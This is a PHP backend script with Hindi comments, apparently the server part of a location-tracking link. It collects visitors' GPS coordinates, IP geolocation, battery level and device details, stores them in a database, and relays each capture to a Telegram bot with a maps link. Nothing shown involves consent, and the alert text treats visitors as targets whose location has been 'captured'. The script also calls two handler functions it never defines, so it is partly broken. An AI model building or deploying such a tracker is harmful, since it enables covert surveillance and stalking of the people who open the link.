<?php
/**
 * track.php
 * फोन से आई लोकेशन डेटा रिसीव और सेव करता है
 */

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once 'config.php';

// डेटा प्राप्त करें
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// GET से भी डेटा ले सकते हैं
if (!$data && isset($_GET['data'])) {
    $data = json_decode($_GET['data'], true);
}

if (!$data) {
    // IP-बेस्ड लोकेशन
    $data = [
        'action' => 'ip_lookup',
        'visitor_id' => $_SERVER['REMOTE_ADDR'],
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'timestamp' => time()
    ];
}

$action = $data['action'] ?? 'unknown';

switch ($action) {
    case 'location':
        handleLocation($data);
        break;
    case 'fallback':
        handleFallback($data);
        break;
    case 'battery':
        handleBattery($data);
        break;
    case 'network':
        handleNetwork($data);
        break;
    case 'click':
        handleClick($data);
        break;
    case 'ip_lookup':
    default:
        handleIpLookup($data);
        break;
}

/**
 * GPS लोकेशन सेव करें
 */
function handleLocation($data) {
    global $conn;
    
    // IP लोकेशन भी ले लें
    $ipData = getIpLocation($_SERVER['REMOTE_ADDR'] ?? '');
    
    $stmt = $conn->prepare("INSERT INTO locations 
        (visitor_id, latitude, longitude, accuracy, altitude, speed, heading,
         ip, ip_lat, ip_lng, ip_city, ip_country, ip_isp,
         user_agent, platform, language, screen, timezone, battery,
         timestamp, page_url)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    $pageUrl = $_SERVER['HTTP_REFERER'] ?? 'direct';
    
    $stmt->bind_param("sddddddsddsssssssssis", 
        $data['visitor_id'],
        $data['latitude'],
        $data['longitude'],
        $data['accuracy'],
        $data['altitude'],
        $data['speed'],
        $data['heading'],
        $_SERVER['REMOTE_ADDR'],
        $ipData['lat'],
        $ipData['lon'],
        $ipData['city'],
        $ipData['country'],
        $ipData['isp'],
        $data['user_agent'],
        $data['platform'],
        $data['language'],
        $data['screen'],
        $data['timezone'],
        $data['battery'],
        $data['timestamp'],
        $pageUrl
    );
    
    $stmt->execute();
    
    // टेलीग्राम पर नोटिफिकेशन भेजें (ऑप्शनल)
    sendTelegramNotification($data);
    
    echo json_encode(['status' => 'ok', 'id' => $conn->insert_id]);
    $stmt->close();
}

/**
 * फॉलबैक - सिर्फ IP लोकेशन
 */
function handleFallback($data) {
    global $conn;
    
    $ipData = getIpLocation($_SERVER['REMOTE_ADDR'] ?? '');
    
    $stmt = $conn->prepare("INSERT INTO fallback_logs
        (visitor_id, reason, ip, ip_lat, ip_lng, ip_city, ip_country,
         user_agent, platform, language, screen, timezone, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    $stmt->bind_param("ssssddssssssi",
        $data['visitor_id'],
        $data['reason'],
        $_SERVER['REMOTE_ADDR'],
        $ipData['lat'],
        $ipData['lon'],
        $ipData['city'],
        $ipData['country'],
        $data['user_agent'],
        $data['platform'],
        $data['language'],
        $data['screen'],
        $data['timezone'],
        $data['timestamp']
    );
    
    $stmt->execute();
    echo json_encode(['status' => 'ok', 'type' => 'fallback']);
    $stmt->close();
}

/**
 * बैटरी इंफो
 */
function handleBattery($data) {
    global $conn;
    
    $stmt = $conn->prepare("UPDATE visitors SET 
        battery_level = ?, battery_charging = ?
        WHERE visitor_id = ?");
    
    $stmt->bind_param("iis",
        $data['level'],
        $data['charging'],
        $data['visitor_id']
    );
    $stmt->execute();
    $stmt->close();
    
    echo json_encode(['status' => 'ok']);
}

/**
 * IP से लोकेशन प्राप्त करें
 */
function getIpLocation($ip) {
    $default = ['lat' => 0, 'lon' => 0, 'city' => '', 'country' => '', 'isp' => ''];
    
    if ($ip == '127.0.0.1' || $ip == '::1') return $default;
    
    // ip-api.com से फ्री IP लोकेशन
    $url = "http://ip-api.com/json/{$ip}?fields=status,lat,lon,city,country,isp,org,query";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if ($data && $data['status'] == 'success') {
        return [
            'lat' => $data['lat'],
            'lon' => $data['lon'],
            'city' => $data['city'] ?? '',
            'country' => $data['country'] ?? '',
            'isp' => $data['isp'] ?? $data['org'] ?? ''
        ];
    }
    
    return $default;
}

/**
 * टेलीग्राम नोटिफिकेशन (ऑप्शनल)
 */
function sendTelegramNotification($data) {
    // अपना बॉट टोकन और चैट आईडी डालें
    $botToken = 'YOUR_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    if ($botToken == 'YOUR_BOT_TOKEN') return;
    
    $lat = $data['latitude'] ?? 0;
    $lng = $data['longitude'] ?? 0;
    $accuracy = $data['accuracy'] ?? 0;
    
    $mapsLink = "https://www.google.com/maps?q={$lat},{$lng}";
    
    $message = "📍 *नई लोकेशन कैप्चर!*\n";
    $message .= "🆔 विज़िटर: `{$data['visitor_id']}`\n";
    $message .= "📍 {$lat}, {$lng}\n";
    $message .= "🎯 अक्यूरेसी: {$accuracy}m\n";
    $message .= "🖥 प्लेटफॉर्म: {$data['platform']}\n";
    $message .= "🌐 भाषा: {$data['language']}\n";
    $message .= "🕐 " . date('d/m/Y H:i:s') . "\n";
    $message .= "🗺 [मैप पर देखें]({$mapsLink})";
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}
